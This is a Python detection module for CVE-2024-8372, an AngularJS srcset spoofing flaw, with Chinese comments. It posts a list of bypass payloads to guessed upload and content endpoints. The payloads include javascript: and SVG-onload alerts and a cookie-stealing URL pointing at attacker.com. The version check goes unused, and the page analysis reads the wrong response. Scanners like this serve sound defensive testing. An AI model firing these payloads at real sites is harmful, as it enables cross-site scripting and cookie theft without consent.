"""
CVE-2024-8372 Vulnerability Detection Script
AngularJS Content Spoofing in srcset - CVSS 4.8 (Medium)
HeroDevs Vulnerability Directory
"""

import requests
import re
from urllib.parse import urljoin

def scan(session, target_url):
    """
    掃描 CVE-2024-8372 弱點
    AngularJS srcset 內容欺騙弱點
    影響版本: AngularJS ≥ 1.3.0-rc.4
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2024-8372: AngularJS srcset 內容欺騙弱點，可繞過圖片來源限制',
        'remediation': '更新到 AngularJS NES 1.9.6 或 1.5.22，實施嚴格的 srcset 驗證和來源限制'
    }
    
    try:
        print("      [檢測] 正在檢查 CVE-2024-8372 srcset 內容欺騙弱點...")
        
        # 檢測 AngularJS 版本和 srcset 使用
        response = session.get(target_url, timeout=30)
        
        angular_indicators = [
            'angular.js',
            'angular.min.js',
            'ng-app',
            'ng-controller'
        ]
        
        srcset_indicators = [
            'ng-srcset',
            'ng-attr-srcset',
            'ng-prop-srcset',
            'srcset=',
            'ngSrcset'
        ]
        
        uses_angular = any(indicator in response.text.lower() for indicator in angular_indicators)
        uses_srcset = any(indicator in response.text.lower() for indicator in srcset_indicators)
        
        if not uses_angular:
            result['evidence'] = "未檢測到 AngularJS 應用程式"
            return result
        
        print(f"      [檢測] 發現 AngularJS 應用程式，srcset 使用情況: {'是' if uses_srcset else '否'}")
        
        # 檢查 AngularJS 版本是否受影響
        version_patterns = [
            r'angular\.version\s*=\s*["\']([0-9.]+)',
            r'angular\.js\?v=([0-9.]+)',
            r'angular\.min\.js\?v=([0-9.]+)',
            r'AngularJS\s+v([0-9.]+)'
        ]
        
        detected_version = None
        for pattern in version_patterns:
            match = re.search(pattern, response.text)
            if match:
                detected_version = match.group(1)
                print(f"      [檢測] 檢測到 AngularJS 版本: {detected_version}")
                break
        
        # 測試 srcset 內容欺騙攻擊
        test_endpoints = [
            '/api/image',
            '/api/upload',
            '/api/gallery',
            '/upload',
            '/image',
            '/media',
            '/content',
            '/profile/avatar'
        ]
        
        # CVE-2024-8372 特定攻擊負載
        srcset_bypass_payloads = [
            {
                'payload': 'https://trusted.com/image.jpg xyz,https://untrusted.com/malicious.jpg',
                'description': 'Comma-separated srcset bypass'
            },
            {
                'payload': 'https://trusted.com/image.jpg 2x,data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+',
                'description': 'Data URI in srcset'
            },
            {
                'payload': 'https://trusted.com/image.jpg 1x, https://evil.com/malicious.svg 2x',
                'description': 'Space-separated bypass'
            },
            {
                'payload': 'https://trusted.com/safe.jpg normal,javascript:alert(document.domain)',
                'description': 'JavaScript URI bypass'
            },
            {
                'payload': 'https://trusted.com/image.jpg 480w,https://attacker.com/steal.php?cookie=document.cookie',
                'description': 'Cookie stealing attempt'
            }
        ]
        
        for endpoint in test_endpoints:
            try:
                # 測試端點是否存在
                test_response = session.get(urljoin(target_url, endpoint), timeout=15)
                if test_response.status_code == 404:
                    continue
                
                print(f"      [檢測] 測試端點: {endpoint}")
                
                for payload_data in srcset_bypass_payloads:
                    payload = payload_data['payload']
                    description = payload_data['description']
                    
                    try:
                        # 測試 POST 請求
                        post_data = {
                            'srcset': payload,
                            'ng-srcset': payload,
                            'image_srcset': payload,
                            'responsive_images': payload
                        }
                        
                        response = session.post(
                            urljoin(target_url, endpoint),
                            data=post_data,
                            timeout=15
                        )
                        
                        # 檢查回應是否包含了惡意 srcset
                        if response.status_code in [200, 201, 202]:
                            response_text = response.text.lower()
                            
                            # 檢查是否成功繞過了來源限制
                            bypass_indicators = [
                                'untrusted.com',
                                'evil.com',
                                'attacker.com',
                                'malicious.jpg',
                                'malicious.svg',
                                'javascript:',
                                'data:image/svg+xml',
                                'steal.php'
                            ]
                            
                            found_indicators = [ind for ind in bypass_indicators if ind in response_text]
                            
                            if found_indicators:
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 CVE-2024-8372 srcset 內容欺騙弱點。{description} 成功繞過安全限制。回應包含惡意來源: {', '.join(found_indicators)}。這可能導致不受信任的圖片載入或 XSS 攻擊。"
                                return result
                        
                        # 測試 JSON 格式
                        json_data = {
                            'image': {
                                'srcset': payload
                            },
                            'srcset': payload
                        }
                        
                        headers = {'Content-Type': 'application/json'}
                        response = session.post(
                            urljoin(target_url, endpoint),
                            json=json_data,
                            headers=headers,
                            timeout=15
                        )
                        
                        if response.status_code in [200, 201, 202]:
                            if any(indicator in response.text.lower() for indicator in bypass_indicators):
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 srcset 繞過弱點 (JSON 格式)。{description} 繞過了安全限制。"
                                return result
                        
                        # 測試 GET 參數
                        get_params = {
                            'srcset': payload,
                            'img_srcset': payload,
                            'responsive': payload
                        }
                        
                        response = session.get(
                            urljoin(target_url, endpoint),
                            params=get_params,
                            timeout=15
                        )
                        
                        if response.status_code == 200:
                            # 檢查是否直接反映了惡意 srcset
                            if any(indicator in response.text for indicator in ['untrusted.com', 'evil.com', 'javascript:']):
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 srcset 反射型弱點。{description} 被直接反映在回應中。"
                                return result
                                
                    except Exception as e:
                        continue
                        
            except Exception as e:
                continue
        
        # 分析現有頁面中的 srcset 使用
        print("      [檢測] 分析現有頁面中的 srcset 實作...")
        
        srcset_patterns = [
            r'ng-srcset\s*=\s*["\'][^"\']*["\']',
            r'ng-attr-srcset\s*=\s*["\'][^"\']*["\']',
            r'ng-prop-srcset\s*=\s*["\'][^"\']*["\']',
            r'srcset\s*=\s*["\'][^"\']*["\']'
        ]
        
        found_srcset_usage = []
        for pattern in srcset_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                found_srcset_usage.extend(matches)
        
        if found_srcset_usage:
            print(f"      [檢測] 發現 {len(found_srcset_usage)} 個 srcset 相關用法")
            
            # 檢查是否有不安全的實作
            vulnerable_patterns = []
            for usage in found_srcset_usage:
                # 檢查是否使用了動態內容
                if '{{' in usage and '}}' in usage:
                    vulnerable_patterns.append(usage)
                # 檢查是否包含可疑的逗號分隔內容
                elif ',' in usage and ('http' in usage.lower() or 'data:' in usage.lower()):
                    vulnerable_patterns.append(usage)
            
            if vulnerable_patterns:
                result['vulnerable'] = True
                result['evidence'] = f"在頁面中發現可能受 CVE-2024-8372 影響的 srcset 實作。發現 {len(vulnerable_patterns)} 個潛在弱點用法: {', '.join(vulnerable_patterns[:2])}..."
                return result
        
        # 測試特定的 AngularJS srcset 指令
        directive_tests = [
            ('ng-srcset', 'ng-srcset directive test'),
            ('ng-attr-srcset', 'ng-attr-srcset directive test'),
            ('ng-prop-srcset', 'ng-prop-srcset directive test')
        ]
        
        for directive, test_name in directive_tests:
            try:
                # 構造測試 HTML
                test_html = f'<img {directive}="https://trusted.com/image.jpg,https://evil.com/test.jpg">'
                
                # 測試是否可以注入這樣的內容
                test_data = {
                    'html': test_html,
                    'content': test_html,
                    'template': test_html
                }
                
                for endpoint in ['/api/content', '/api/template', '/content']:
                    try:
                        response = session.post(
                            urljoin(target_url, endpoint),
                            data=test_data,
                            timeout=10
                        )
                        
                        if response.status_code == 200 and 'evil.com' in response.text:
                            result['vulnerable'] = True
                            result['evidence'] = f"通過 {test_name} 成功注入了惡意 srcset 內容"
                            return result
                            
                    except:
                        continue
                        
            except:
                continue
        
        result['evidence'] = f"完成 CVE-2024-8372 檢測。分析了 {len(test_endpoints)} 個端點和 {len(found_srcset_usage)} 個 srcset 用法，未發現明確的內容欺騙弱點。"
        
    except Exception as e:
        result['evidence'] = f"掃描過程中發生錯誤: {str(e)}"
    
    return result